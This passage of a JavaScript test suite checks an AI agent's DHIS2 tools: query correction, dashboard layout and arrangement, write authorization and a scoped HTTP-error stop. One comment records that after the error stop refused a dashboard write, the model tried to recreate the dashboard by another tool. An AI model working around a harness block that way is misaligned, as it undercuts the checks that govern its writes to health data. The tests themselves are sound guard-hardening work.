      : { programStages: [{ id: 'edqlbukwRfQ', displayName: 'Second antenatal care visit', programStageDataElements: [{ dataElement: { id: 'vANAXwtLwcT', displayName: 'Hemoglobin value', valueType: 'NUMBER' } }] }] });
    ctx.validateProgramIndicatorExpressionResilient = async () => ({ status: 'OK' });
    try {
      const a = await ctx._prepareProgramIndicatorObject('WSGAb5XwJ3Y', null, { name: 'x', analytics_type: 'ENROLLMENT', aggregation_type: 'COUNT', expression: 'V{enrollment_count}', filter: "d2:countIfCondition(#{edqlbukwRfQ.vANAXwtLwcT}, '< 11') > 0", events_in_period: true });
      const b = await ctx._prepareProgramIndicatorObject('WSGAb5XwJ3Y', null, { name: 'y', analytics_type: 'ENROLLMENT', aggregation_type: 'COUNT', expression: 'V{enrollment_count}' });
      const t = (pi) => (pi?.analyticsPeriodBoundaries || []).map((x) => x.boundaryTarget).sort().join(',');
      truthy('events_in_period adds EVENT_DATE boundaries to an enrollment indicator (202, not 909); without it only ENROLLMENT_DATE', t(a.pi) === 'ENROLLMENT_DATE,ENROLLMENT_DATE,EVENT_DATE,EVENT_DATE' && t(b.pi) === 'ENROLLMENT_DATE,ENROLLMENT_DATE');
    } finally { ctx.safeDhis2Fetch = saved.sdf; ctx.validateProgramIndicatorExpressionResilient = saved.val; }
  }
  {
    const saved = ctx.safeDhis2Fetch;
    ctx.safeDhis2Fetch = async (p) => {
      if (p === 'system/info') return { lastAnalyticsTableSuccess: '2026-10-29T01:00:00.000' };
      if (p.startsWith('programs/progRt00003')) return { id: 'progRt00003', created: '2020-01-01T00:00:00.000' };
      const dx = decodeURIComponent(p).match(/dx:([^&]+)/)[1].split(';');
      if (dx.length === 1 && dx[0] === 'piSwallow01') return { _error: 'DHIS2 API 409: Query failed because of a syntax error (SqlState: 42883)', _status: 409 };
      return { rows: dx.filter((id) => id !== 'piSwallow01').map((id) => [id, '5.0']) };
    };
    try {
      const rc = await ctx.piRuntimeAnalyticsCheck('progRt00003', ['piGood00002', 'piSwallow01']);
      truthy('an indicator a multi-item query silently leaves out is re-asked alone and caught', rc.ok === false && rc.broken.length === 1 && rc.broken[0].id === 'piSwallow01');
    } finally { ctx.safeDhis2Fetch = saved; }
  }
  {
    vm.runInContext('_captureMetaPending = null;', ctx);
    ctx.noteCaptureMetadataWrite('POST', 'metadata', JSON.stringify({ programIndicators: [{ id: 'piA0000000b', program: { id: 'WSGAb5XwJ3Y' }, displayInForm: false }] }), []);
    const none = ctx.captureMetaPending().programs.size === 0;
    ctx.noteCaptureMetadataWrite('POST', 'metadata', JSON.stringify({ programIndicators: [{ id: 'piA0000000c', program: { id: 'WSGAb5XwJ3Y' }, displayInForm: true }] }), []);
    const one = ctx.captureMetaPending().programs.has('WSGAb5XwJ3Y');
    vm.runInContext('_captureMetaPending = null;', ctx);
    truthy('analytics-only indicators do not bump the program version (no program PATCH); a displayInForm one still does', none && one);
  }

  {
    const h = ctx.healAnalyticsPeriodAndDates('analytics?dimension=dx%3AaTzpJgBMnGk&dimension=ou%3AImspTQPwCqd&dimension=pe%3A2026&startDate=2026-01-01&endDate=2026-12-31');
    const keep = ctx.healAnalyticsPeriodAndDates('analytics?dimension=dx%3AaTzpJgBMnGk&dimension=ou%3AImspTQPwCqd&startDate=2026-01-01&endDate=2026-12-31');
    truthy('/analytics with a period AND start/end dates (409 E7105) drops the dates; dates alone are kept', h.healed && !/startDate|endDate/.test(h.path) && /pe%3A2026/.test(h.path) && !keep.healed);
  }
  {
    const typeMap = { piA0000000d: 'PROGRAM_INDICATOR', piA0000000e: 'PROGRAM_INDICATOR' };
    const swapped = ctx.buildVisualizationObject({ name: 'Avg Hb by month', vis_type: 'LINE', data_items: ['piA0000000d', 'piA0000000e'], periods: ['202601', '202602'], org_units: ['ImspTQPwCqd'], layout: { columns: ['pe'], rows: ['dx'], filters: ['ou'] } }, typeMap);
    const named = ctx.buildVisualizationObject({ name: 'Near-miss by district', vis_type: 'STACKED_BAR', data_items: ['piA0000000d', 'piA0000000e'], periods: ['2026'], org_units: ['ImspTQPwCqd', 'LEVEL-2'], layout: { category: ['ou'], series: ['dx'], filters: ['pe'] } }, typeMap);
    const pivot = ctx.buildVisualizationObject({ name: 'Table', vis_type: 'PIVOT_TABLE', data_items: ['piA0000000d'], periods: ['2026'], org_units: ['ImspTQPwCqd', 'LEVEL-2'], layout: { rows: ['ou'], columns: ['dx'], filters: ['pe'] } }, typeMap);
    truthy('chart layout: data items alone on the x-axis (columns:[pe], rows:[dx]) is swapped back with a note; category/series names map to rows/columns; pivots untouched',
      swapped.viz.rowDimensions.join() === 'pe' && swapped.viz.columnDimensions.join() === 'dx' && /Layout corrected/.test(swapped.layoutNote || '')
      && named.viz.rowDimensions.join() === 'ou' && named.viz.columnDimensions.join() === 'dx' && !named.layoutNote
      && pivot.viz.rowDimensions.join() === 'ou' && !pivot.layoutNote);
  }

  {
    const saved = ctx.safeDhis2Fetch; const seen = [];
    ctx.safeDhis2Fetch = async (p) => { seen.push(p); if (p.startsWith('programStages/')) return { program: { id: 'WSGAb5XwJ3Y' } }; return { _error: 'stop here', _status: 400 }; };
    const dd = ctx.__dhis2(); const savedPc = dd.pageContext; dd.pageContext = { appType: 'Dashboard' };
    try {
      const r = await ctx.executeTool('count_records', { record_type: 'events', stage_id: 'edqlbukwRfQ', ou_override: 'ImspTQPwCqd' });
      truthy('count_records with only a stage_id (no program page) finds the stage\'s program instead of "no program in context"', !/No program in context/.test(r?._error || '') && seen.some((p) => p.startsWith('programStages/edqlbukwRfQ')));
    } finally { ctx.safeDhis2Fetch = saved; dd.pageContext = savedPc; }
  }

  {
    const saved = ctx.safeDhis2Fetch;
    ctx.safeDhis2Fetch = async (p) => (p.startsWith('programs/WSGAb5XwJ3Y') ? { programStages: [{ id: 'WZbXY0S00lP' }, { id: 'edqlbukwRfQ' }] } : { _error: 'x' });
    try {
      const ev = await ctx.healBareStageDimension('analytics/events/aggregate/WSGAb5XwJ3Y?dimension=ou%3AImspTQPwCqd&dimension=pe%3A2026&dimension=WZbXY0S00lP');
      const en = await ctx.healBareStageDimension('analytics/enrollments/aggregate/WSGAb5XwJ3Y?dimension=ou%3AImspTQPwCqd&dimension=WZbXY0S00lP');
      const de = await ctx.healBareStageDimension('analytics/events/aggregate/WSGAb5XwJ3Y?dimension=ou%3AImspTQPwCqd&dimension=vANAXwtLwcT&stage=WZbXY0S00lP');
      truthy('a stage UID sent as dimension= (409 E7224) becomes stage= on event analytics, is refused on enrollment analytics, and a data element is left alone',
        ev.healed && /stage=WZbXY0S00lP$/.test(ev.path) && !/dimension=WZbXY0S00lP/.test(ev.path) && en.refusal && en.refusal._scope === 'stage_as_dimension' && !de.healed && !de.refusal);
      // Malaria dashboard run (2026-11-08): dimension:["ou:…","stage=<uid>"] → two 409s.
      const inDim = ctx.healParamInsideDimension('analytics/events/aggregate/WSGAb5XwJ3Y?dimension=ou%3AUSER_ORGUNIT%3BLEVEL-3&dimension=stage%3DWZbXY0S00lP&startDate=2025-11-01');
      const kept = ctx.healParamInsideDimension('analytics/events/aggregate/WSGAb5XwJ3Y?dimension=stage=edqlbukwRfQ&stage=WZbXY0S00lP');
      const filterOk = ctx.healParamInsideDimension('analytics/events/query/WSGAb5XwJ3Y?dimension=vANAXwtLwcT:EQ:a=b&filter=ou:LEVEL-2');
      truthy('a query parameter written inside dimension= (stage=<uid>) is moved to its own parameter and said in the result; one already given keeps its value; a filter value holding "=" is left alone',
        inDim.healed && inDim.path === 'analytics/events/aggregate/WSGAb5XwJ3Y?dimension=ou%3AUSER_ORGUNIT%3BLEVEL-3&stage=WZbXY0S00lP&startDate=2025-11-01' && /stage=WZbXY0S00lP was written inside a dimension/.test(inDim.note)
        && kept.healed && kept.path === 'analytics/events/aggregate/WSGAb5XwJ3Y?stage=WZbXY0S00lP' && /already has that parameter/.test(kept.note) && !filterOk.healed);
      {
    const b = ctx.healAnalyticsBooleanFilter;
    truthy('Yes/No analytics filters become 1/0 (EQ, NE, IN; any case; dimension or filter; comma-joined dimensions), other values and other endpoints are left alone',
      b('analytics/events/aggregate/p?filter=s.d:EQ:true&dimension=pe:2026') === 'analytics/events/aggregate/p?filter=s.d%3AEQ%3A1&dimension=pe:2026'
      && /dimension=ou%3AX%2Cd%3Ane%3A0%2Cpe%3AY/.test(b('analytics/events/query/p?dimension=ou:X,d:ne:FALSE,pe:Y'))
      && b('analytics/events/query/p?filter=d:EQ:trueish') === 'analytics/events/query/p?filter=d:EQ:trueish'
      && b('analytics?dimension=dx:a&filter=d:EQ:true') === 'analytics?dimension=dx:a&filter=d:EQ:true');
  }
  // Malaria follow-up board (2026-11-08): filter=<de>:CURED and <de>:<option id> → 409s.
      const opSeen = [];
      ctx.safeDhis2Fetch = async (p) => { opSeen.push(p); return p.startsWith('options?filter=id:in:[') ? { options: /IN4Rqe6lyoJ/.test(p) ? [{ id: 'IN4Rqe6lyoJ', code: 'CURED' }] : [] } : { _error: 'Not found', _status: 404 }; };
      const op1 = await ctx.healItemFilterOperator('analytics/events/aggregate/l0NXObayGhi?dimension=pe:LAST_12_MONTHS&filter=ou:USER_ORGUNIT&filter=VWwjl5N3CYJ:CURED&stage=ILSztnThbiV');
      const op2 = await ctx.healItemFilterOperator('analytics/events/aggregate/l0NXObayGhi?filter=ILSztnThbiV.VWwjl5N3CYJ:IN4Rqe6lyoJ&dimension=VWwjl5N3CYJ:CURED;FAILED');
      const op3 = await ctx.healItemFilterOperator('analytics/events/aggregate/l0NXObayGhi?dimension=J5jldMd8OHv:uIuxlbV1vRT;EYbopBOJWsW&filter=VWwjl5N3CYJ:eq:CURED&dimension=pe:2026');
      truthy('an item filter without an operator gets EQ (several values IN), an option id is sent as its code, and a group-set dimension or a filter that has an operator is left alone',
        op1.healed && /filter=VWwjl5N3CYJ%3AEQ%3ACURED/.test(op1.path) && /needs an operator/.test(op1.note)
        && op2.healed && /filter=ILSztnThbiV.VWwjl5N3CYJ%3AEQ%3ACURED/.test(op2.path) && /dimension=VWwjl5N3CYJ%3AIN%3ACURED%3BFAILED/.test(op2.path)
        && !op3.healed && opSeen.every(p => p.startsWith('options?filter=id:in:[')));
      const savedFetch = ctx.safeDhis2Fetch;
      const sent = [];
      ctx.safeDhis2Fetch = async (p) => { sent.push(p); return p.startsWith('programs/WSGAb5XwJ3Y') ? { programStages: [{ id: 'WZbXY0S00lP' }] } : (p.startsWith('analytics/') ? { headers: [{ name: 'value' }], rows: [['5']] } : { _error: 'x' }); };
      const viaTool = await ctx.executeTool('dhis2_query', { path: 'analytics/events/aggregate/WSGAb5XwJ3Y', query_params: { dimension: ['ou:USER_ORGUNIT', 'WZbXY0S00lP'], startDate: '2025-11-01', endDate: '2026-10-31' } });
      ctx.safeDhis2Fetch = savedFetch;
      truthy('…and a bare stage moved to stage= is said in the result too (a model saved the bare form as a lesson because it "worked")',
        /a program stage is not a dimension/.test(viaTool?._query_corrected || '') && /stage=WZbXY0S00lP/.test(viaTool?._query_corrected || '') && sent.some(p => /^analytics\/events\/aggregate\/WSGAb5XwJ3Y\?.*stage=WZbXY0S00lP/.test(p)));
    } finally { ctx.safeDhis2Fetch = saved; }
  }

  {
    const saved = ctx.safeDhis2Fetch;
    ctx.safeDhis2Fetch = async (p) => (p.startsWith('organisationUnits?') ? { organisationUnits: [{ id: 'O6uvpzGd5pu' }, { id: 'fdc6uOvgoji' }] } : { _error: 'x' });
    try {
      const spec = { name: 't', vis_type: 'PIVOT_TABLE', org_units: ['ImspTQPwCqd', 'LEVEL-2'], overall_row: true };
      const r = await ctx.applyOverallRow(spec);
      const bad = await ctx.applyOverallRow({ org_units: ['LEVEL-2'], overall_row: true });
      truthy('overall_row turns [parent, LEVEL-n] into the parent as its own row + explicit level-n rows (percent totals computed from all records)', r && r.note && spec.org_units.join() === 'ImspTQPwCqd,O6uvpzGd5pu,fdc6uOvgoji' && !!bad._error);
    } finally { ctx.safeDhis2Fetch = saved; }
  }
  {
    const llCtx2 = {
      program: { name: 'P', programType: 'WITH_REGISTRATION' },
      stages: [{ id: 'WZbXY0S00lP', name: 'First ANC', repeatable: false, deIds: ['vANAXwtLwcT'] }, { id: 'PFDfvmGpsR3', name: 'Care at birth', repeatable: false, deIds: ['vANAXwtLwcT'] }],
      stagesById: new Map([['WZbXY0S00lP', { id: 'WZbXY0S00lP', name: 'First ANC', repeatable: false, deIds: ['vANAXwtLwcT'] }], ['PFDfvmGpsR3', { id: 'PFDfvmGpsR3', name: 'Care at birth', repeatable: false, deIds: ['vANAXwtLwcT'] }]]),
      stagesByName: new Map(), teas: new Map(), teaByName: new Map(), pis: new Map(), piByName: new Map(),
      des: new Map([['vANAXwtLwcT', { id: 'vANAXwtLwcT', name: 'Hemoglobin value', valueType: 'NUMBER', stageIds: ['WZbXY0S00lP', 'PFDfvmGpsR3'] }]]), deByName: new Map(),
    };
    const st = await ctx.lineListResolveDimension({ dimension: 'program_status' }, llCtx2, 'ENROLLMENT', new Map(), 'column');
    const a = await ctx.lineListResolveDimension({ dimension: 'vANAXwtLwcT', program_stage_id: 'WZbXY0S00lP' }, llCtx2, 'ENROLLMENT', new Map(), 'column');
    const b = await ctx.lineListResolveDimension({ dimension: 'vANAXwtLwcT', program_stage_id: 'PFDfvmGpsR3' }, llCtx2, 'ENROLLMENT', new Map(), 'column');
    truthy('line list: a status column with no statuses shows every status; the same data element from two stages resolves to two stage-qualified columns',
      st.kind === 'status' && st.items.length === 3 && a.stageId === 'WZbXY0S00lP' && b.stageId === 'PFDfvmGpsR3');
  }

  truthy('count_records filters keep the analytics operator (the old "de:value" form 409\'d) and Yes/No becomes 1/0',
    ctx.countRecordsFilterDimension('FIHEeJwfhZH:eq:true', 'PFDfvmGpsR3.') === 'PFDfvmGpsR3.FIHEeJwfhZH:EQ:1' && ctx.countRecordsFilterDimension('vANAXwtLwcT:lt:11') === 'vANAXwtLwcT:LT:11' && ctx.countRecordsFilterDimension('nonsense') === null);

  {
    // create_dashboard / add_items end to end with stubbed DHIS2 (shared
    // inline-visualization + grid helpers; a refactor once left create_dashboard
    // referencing a removed local and throwing after the save).
    const saved = { sdf: ctx.safeDhis2Fetch, wa: d.writeAuth, consent: d.harnessSkipBackupConsent };
    const posts = [];
    d.writeAuth = { scope: 'broad', reason: 'verify' };
    d.harnessSkipBackupConsent = true;
    ctx.safeDhis2Fetch = async (p, o = {}) => {
      if (o.method === 'POST' || o.method === 'PUT') { posts.push(p); return { status: 'OK', httpStatus: 'OK', response: { status: 'OK', stats: { created: 1, updated: 0, deleted: 0, ignored: 0, total: 1 }, typeReports: [] } }; }
      if (/^programIndicators/.test(p)) return { programIndicators: [{ id: 'piA0000000f', displayName: 'PI', program: { id: 'WSGAb5XwJ3Y' } }] };
      if (/^(indicators|dataElements)/.test(p)) return { indicators: [], dataElements: [] };
      if (/^dashboards\/Dash0000002/.test(p)) return { id: 'Dash0000002', name: 'D', dashboardItems: [{ id: 'Item0000001', type: 'TEXT', text: 'x', x: 0, y: 0, width: 58, height: 4 }] };
      if (/^dataStore/.test(p)) return { status: 'OK' };
      if (/^analytics/.test(p)) return { rows: [['piA0000000f', '5']] };
      if (/^me\b|organisationUnits/.test(p)) return { organisationUnits: [{ id: 'ImspTQPwCqd', level: 1 }], dataViewOrganisationUnits: [{ id: 'ImspTQPwCqd' }] };
      return {};
    };
    try {
      const viz = { name: 'Monthly', vis_type: 'COLUMN', data_items: ['piA0000000f'], periods: ['THIS_YEAR'], org_units: ['USER_ORGUNIT'], layout: { columns: ['pe'], rows: ['dx'] } };
      const cd = await ctx.executeTool('manage_dashboards', { action: 'create_dashboard', dashboard: { name: 'Verify dash' }, items: [{ type: 'TEXT', text: '# t' }, { new_visualization: viz }] });
      const ai = await ctx.executeTool('manage_dashboards', { action: 'add_items', dashboard_id: 'Dash0000002', items: [{ new_visualization: { ...viz, name: 'Second' } }], skip_backup: true });
      truthy('create_dashboard and add_items with an inline chart run end to end (shared helpers), correct the chart axes and return the dashboard link',
        cd && cd.success && /dhis-web-dashboard\/#\//.test(cd.dashboard_url || '') && cd.items === 2 && Array.isArray(cd._layout_corrected)
        && ai && ai.success && ai.items_added === 1);
    } finally { ctx.safeDhis2Fetch = saved.sdf; d.writeAuth = saved.wa; d.harnessSkipBackupConsent = saved.consent; }
  }
  {
    const problems = ctx.checkToolRegistry();
    truthy('tool registry: router, write/manual sets, summaries, manual extras and patient-data tools all derive from / agree with TOOLS', Array.isArray(problems) && problems.length === 0 && Object.keys(ctx.__TOOL_ROUTER).length === vm.runInContext('TOOLS.length', ctx));
  }

  // The system prompt teaches the feasibility check on analytics builds.
  const sp = await ctx.buildSystemPrompt('continue', false, false, ask);
  truthy('system prompt: the analytics feasibility section rides on a "continue" turn of a dashboard build', /first match each request to what DHIS2 can actually build/.test(sp) && /PIVOT_TABLE/.test(sp));
  d.apiVersion = savedApi;
}


// Dashboard layout 2026-11-01: the model sent x/y/width/height for a
// 12-column grid and the RMNCH dashboard saved 70-px KPI tiles and sliver
// charts. Tiles are now sized from what they show on the real 60-column grid.
async function runDashboardLayoutChecks() {
  console.log('\nDashboard layout (60-column grid, tiles sized from content, arrange) + analytics id lists:');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const d = ctx.__dhis2();
  const sv = (name) => ({ itemType: 'VISUALIZATION', vizType: 'SINGLE_VALUE', name, rows: [], columns: [{ dimension: 'dx', items: ['a'] }] });
  const chart = (vizType, name, rows, columns) => ({ itemType: 'VISUALIZATION', vizType, name, rows, columns });
  const kpis = [sv('New registrations (2026)'), sv('Follow-up ANC visits with hemoglobin below 11 (2026)'), sv('First ANC visits with hemoglobin below 11 (%)'), sv('Registrations with a low-hemoglobin follow-up ANC visit (2026)')];
  const monthly5 = chart('COLUMN', 'Records by visit type, monthly', [{ dimension: 'pe', items: ['MONTHS_THIS_YEAR'] }], [{ dimension: 'dx', items: ['a', 'b', 'c', 'd', 'e'] }]);
  const line2 = chart('LINE', 'Average hemoglobin, monthly', [{ dimension: 'pe', items: ['MONTHS_THIS_YEAR'] }], [{ dimension: 'dx', items: ['a', 'b'] }]);
  const districts = chart('STACKED_COLUMN', 'Near-miss by district', [{ dimension: 'ou', items: ['ImspTQPwCqd', 'LEVEL-2'] }], [{ dimension: 'dx', items: ['y', 'n', 'u'] }]);
  const infos = [...kpis, monthly5, line2, districts];
  const rowsOf = (shapes) => { const by = {}; for (const s of shapes) (by[s.y] = by[s.y] || []).push(s); return Object.values(by); };
  const wellFormed = (shapes) => rowsOf(shapes).every(r => r.reduce((a, s) => a + s.width, 0) === 60 && r.every(s => s.height === r[0].height))
    && shapes.every((a, i) => shapes.every((b, j) => i === j || a.y + a.height <= b.y || b.y + b.height <= a.y || a.x + a.width <= b.x || b.x + b.width <= a.x));

  // 1. The run's own numbers (a 12-column guess): KPIs 3 wide, charts 12 wide on their own rows.
  const sent = [...[0, 3, 6, 9].map(x => ({ x, y: 0, width: 3, height: 2 })), { x: 0, y: 2, width: 12, height: 5 }, { x: 0, y: 7, width: 12, height: 5 }, { x: 0, y: 12, width: 12, height: 5 }];
  const a = ctx.layoutDashboardItems(sent, infos, 0, { 2: 13 });
  const kpiRow = a.shapes.slice(0, 4);
  truthy('12-column numbers from the model: the 4 KPI tiles share one row at 15 of 60 columns, tall enough for a 3-line title (≥9 rows), and charts are never narrower than 20',
    kpiRow.every(s => s.width === 15 && s.y === 0 && s.height >= 9) && a.shapes.slice(4).every(s => s.width >= 20 && s.height >= 14) && wellFormed(a.shapes) && /12-column/.test(a.note || ''));
  // 2. No numbers: dense charts go full width; a half chart with no partner is widened.
  const b = ctx.layoutDashboardItems(infos.map(() => ({})), infos, 0, { 2: 13 });
  truthy('auto layout: KPI row, then the 60-bar monthly chart, the 13-district chart and the unpaired line chart each full width — rows fill 60 columns, nothing overlaps, no note',
    b.shapes.slice(0, 4).every(s => s.width === 15) && b.shapes.slice(4).every(s => s.width === 60 && s.height === 20) && wellFormed(b.shapes) && !b.note && b.rows.length === 4);
  // 3. Two ordinary charts pair up side by side; a pivot is full width and as tall as its rows.
  const pie = chart('PIE', 'Share', [], [{ dimension: 'dx', items: ['a', 'b'] }]);
  const pivot = { itemType: 'VISUALIZATION', vizType: 'PIVOT_TABLE', name: 'Districts', rows: [{ dimension: 'ou', items: ['ImspTQPwCqd', 'LEVEL-2'] }], columns: [{ dimension: 'dx', items: ['a', 'b'] }] };
  const c = ctx.layoutDashboardItems([{}, {}, {}, { type: 'MAP' }], [line2, pie, pivot, { itemType: 'MAP', name: 'Map' }], 30, { 2: 13 });
  truthy('two half charts sit side by side (30 + 30), a 13-row pivot is full width and ≥20 rows tall, a lone map is widened, all from startY',
    c.shapes[0].x === 0 && c.shapes[1].x === 30 && c.shapes[0].y === 30 && c.shapes[1].y === 30 && c.shapes[2].width === 60 && c.shapes[2].height >= 20 && c.shapes[3].width === 60 && wellFormed(c.shapes));
  // 4. size hints and real-scale numbers.
  const e = ctx.layoutDashboardItems([{ size: 'full' }, { width: 30, height: 24 }, { width: 30 }], [line2, line2, pie], 0, {});
  const f = ctx.layoutDashboardItems([{ size: 'half' }], [{ itemType: 'APP', name: 'Plugin' }], 0, {});
  const g0 = ctx.layoutDashboardItems([{ width: 29 }], [line2], 0, {});
  truthy('size:"full" is honoured; widths on the real 60-column scale keep their half and a taller height; an asked-for half stays half alone, a guessed width 29 alone is widened',
    e.shapes[0].width === 60 && e.shapes[1].width === 30 && e.shapes[1].height === 24 && e.shapes[2].x === 30 && f.shapes[0].width === 30 && g0.shapes[0].width === 60);
  const plug2 = ctx.layoutDashboardItems([{}, {}], [{ itemType: 'APP', name: 'Scorecard' }, { itemType: 'APP', name: 'Scorecard' }], 0, {});
  truthy('a dashboard plugin tile defaults to full width and 32 rows (the scorecard showed 6 of 14 rows at 30 x 20); two copies stack',
    plug2.shapes.every(sh => sh.width === 60 && sh.height >= 32) && plug2.shapes[1].y >= plug2.shapes[0].y + 32);

  const saved = { sdf: ctx.safeDhis2Fetch, wa: d.writeAuth, consent: d.harnessSkipBackupConsent, base: d.baseUrl };
  const posts = [];
  d.writeAuth = { scope: 'broad', reason: 'verify' };
  d.harnessSkipBackupConsent = true;
  d.baseUrl = d.baseUrl || 'https://verify.example/dhis';
  const squeezed = [
    { id: 'Item000000A', type: 'VISUALIZATION', x: 0, y: 0, width: 3, height: 6, visualization: { id: 'VizKpi0000A' } },
    { id: 'Item000000B', type: 'VISUALIZATION', x: 3, y: 0, width: 3, height: 6, visualization: { id: 'VizKpi0000B' } },
    { id: 'Item000000C', type: 'VISUALIZATION', x: 0, y: 6, width: 12, height: 11, visualization: { id: 'VizCol0000C' } },
  ];
  let stored = JSON.parse(JSON.stringify(squeezed));
  ctx.safeDhis2Fetch = async (p, o = {}) => {
    if (o.method === 'POST' || o.method === 'PUT') {
      posts.push({ p, body: typeof o.body === 'string' ? JSON.parse(o.body) : o.body });
      const dash = posts[posts.length - 1].body?.dashboards?.[0];
      if (dash && !/importMode=VALIDATE/.test(p)) stored = dash.dashboardItems;
      return { status: 'OK', httpStatus: 'OK', response: { status: 'OK', stats: { created: 0, updated: 1, deleted: 0, ignored: 0, total: 1 }, typeReports: [] } };
    }
    if (/^dashboards\/Dash000000L\?fields=id,displayName/.test(p)) return { id: 'Dash000000L', displayName: 'L', dashboardItems: squeezed.map(it => ({ ...it, visualization: { ...it.visualization, displayName: it.id === 'Item000000C' ? 'Monthly' : 'Registrations with a low-hemoglobin follow-up ANC visit (2026)', type: it.id === 'Item000000C' ? 'COLUMN' : 'SINGLE_VALUE' } })) };
    if (/^dashboards\/Dash000000L\?fields=:owner/.test(p)) return { id: 'Dash000000L', name: 'L', dashboardItems: JSON.parse(JSON.stringify(squeezed)) };
    if (/^dashboards\/Dash000000L\?fields=dashboardItems/.test(p)) return { dashboardItems: stored };
    if (/^visualizations\?filter=id:in/.test(p)) return { visualizations: [
      { id: 'VizKpi0000A', displayName: 'New registrations (2026)', type: 'SINGLE_VALUE', rows: [], columns: [{ dimension: 'dx', items: [{ id: 'a' }] }] },
      { id: 'VizKpi0000B', displayName: 'Registrations with a low-hemoglobin follow-up ANC visit (2026)', type: 'SINGLE_VALUE', rows: [], columns: [{ dimension: 'dx', items: [{ id: 'a' }] }] },
      { id: 'VizCol0000C', displayName: 'Monthly', type: 'COLUMN', rows: [{ dimension: 'pe', items: [{ id: '202601' }, { id: '202602' }] }], columns: [{ dimension: 'dx', items: [{ id: 'a' }] }] }] };
    if (/^dataStore/.test(p)) return { status: 'OK' };
    return {};
  };
  try {
    const g = await ctx.executeTool('manage_dashboards', { action: 'get', dashboard_id: 'Dash000000L' });
    truthy('get flags the squeezed tiles (3 of 60 columns) and points to action="arrange"',
      g && g.success && g.items.filter(it => it.too_small).length === 3 && /arrange/.test(g._layout_warning || ''));
    const ar = await ctx.executeTool('manage_dashboards', { action: 'arrange', dashboard_id: 'Dash000000L' });
    const kp = stored.filter(it => it.id !== 'Item000000C');
    const ch = stored.find(it => it.id === 'Item000000C');
    truthy('arrange re-sizes the saved tiles (2 KPIs at 30 columns side by side, ≥8 rows for a 2-line title; the unpaired chart widened to 60), backs up first and reads the shapes back',
      ar && ar.success && ar.changed === 3 && kp.every(it => it.width === 30 && it.y === 0 && it.height >= 8) && ch.width === 60 && ch.y === kp[0].height && ch.height === 20 && ar.backup && !ar._warning && Array.isArray(ar.tile_rows));
    const bad1 = await ctx.executeTool('manage_dashboards', { action: 'arrange', dashboard_id: 'Dash000000L', items: [{ item_id: 'NoSuchItem1', size: 'full' }] });
    truthy('arrange refuses an unknown item_id instead of guessing', bad1 && /NoSuchItem1/.test(bad1._error || ''));
  } finally { ctx.safeDhis2Fetch = saved.sdf; d.writeAuth = saved.wa; d.harnessSkipBackupConsent = saved.consent; d.baseUrl = saved.base; }

  // The same replay's one failed call: twelve PI ids joined by ";" in one
  // event-analytics dimension, one with a case slip (409 E7224).
  {
    const h = ctx.healBareDxList('analytics?dimension=Vr09z7YcgIH;lblLRKmS7VS&dimension=pe:2026&filter=ou:ImspTQPwCqd');
    const one = ctx.healBareDxList('analytics?dimension=J5jldMd8OHv&dimension=pe:2026');
    truthy('/analytics: a bare list of ids gets the dx: prefix (E7125 otherwise); one bare id (a category dimension) is left alone',
      h.healed && /dimension=dx:Vr09z7YcgIH;lblLRKmS7VS&/.test(h.path) && !one.healed);
    const savedF = ctx.safeDhis2Fetch;
    ctx.safeDhis2Fetch = async (p) => {
      if (/^programIndicators\?filter=id:in/.test(p)) return { programIndicators: [{ id: 'Vr09z7YcgIH' }] };
      if (/^programIndicators\?filter=program\.id:eq:WSGAb5XwJ3Y/.test(p)) return { programIndicators: [{ id: 'Vr09z7YcgIH', displayName: 'Yes' }, { id: 'lblLRKmS7VS', displayName: 'No' }] };
      return {};
    };
    try {
      const slip = await ctx.routeProgramIndicatorAnalytics('analytics/events/aggregate/WSGAb5XwJ3Y?dimension=pe:2026&dimension=Vr09z7YcgIH;lblLRKmS7Vs');
      const other = await ctx.routeProgramIndicatorAnalytics('analytics/events/aggregate/WSGAb5XwJ3Y?dimension=pe:2026&dimension=Vr09z7YcgIH;AAAAAAAAAAA');
      truthy('event analytics: a case-slipped PI id is refused with the right one; a ";"-joined list that cannot move to /analytics is refused — neither is sent',
        /did you mean lblLRKmS7VS/.test(slip.refusal?._error || '') && other.refusal?._scope === 'analytics_joined_dimension');
    } finally { ctx.safeDhis2Fetch = savedF; }
  }

  const wa = ctx.classifyWriteAuthorization('The tiles on my dashboard are squeezed, please rearrange them neatly');
  truthy('"please rearrange them" is a write request (arrange is reachable)', wa && wa.scope !== 'read_only');
  truthy('the manage_dashboards schema offers size (small/half/full), arrange, and no raw x/y/width/height',
    (() => { const t = vm.runInContext('TOOLS', ctx).find(x => x.function.name === 'manage_dashboards'); const p = t.function.parameters.properties; const ip = p.items.items.properties; return p.action.enum.includes('arrange') && ip.size && !ip.x && !ip.width && !/58-column/.test(t.function.description); })());
}

// RMNCH thread 2026-11-01 (play 2.42.7), third prompt ("add two maps, arrange
// the dashboard"): KPI-tile visualization ids sent as analytics data items
// (three 409s), the HTTP-error stop then refused the dashboard write, and the
// model tried to rebuild the dashboard with create_dashboard to reorder it.
async function runDashboardMapsTurnChecks() {
  console.log('\nRMNCH maps turn (lane-scoped HTTP stop, chart ids as data items, insert/reorder tiles, no duplicate dashboard):');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const d = ctx.__dhis2();
  const run = (code) => vm.runInContext(code, ctx);

  // 1. The HTTP-error stop blocks the failing lane, not every tool.
  {
    const saved = { n: d.httpErrorCount, h: d.httpErrorHistory };
    d.httpErrorCount = 0; d.httpErrorHistory = [];
    try {
      const e409 = { _error: 'DHIS2 API 409: Dimension is present in query without any valid dimension options: `dx`', _status: 409 };
      for (let i = 0; i < 3; i++) ctx.noteHttpErrorFromResult('dhis2_query', e409, { method: 'GET', path: 'analytics?x=' + i });
      const read = ctx.httpErrorStopOrNull('dhis2_query', { method: 'GET', path: 'analytics?x=9' });
      const otherEndpoint = ctx.httpErrorStopOrNull('dhis2_query', { method: 'GET', path: 'programIndicators/XJruzyOnBWS' });
      const write = ctx.httpErrorStopOrNull('manage_dashboards', { action: 'add_items', dashboard_id: 'xEtKQVG44h0' });
      const getDash = ctx.httpErrorStopOrNull('manage_dashboards', { action: 'get', dashboard_id: 'xEtKQVG44h0' });
      truthy('3 failed dhis2_query GETs on analytics block more analytics GETs (saying every other tool still works) but not another endpoint, nor manage_dashboards add_items / get',
        read && read._scope === 'http_error_limit_reached' && /every other tool still works/.test(read._hint) && otherEndpoint === null && write === null && getDash === null);
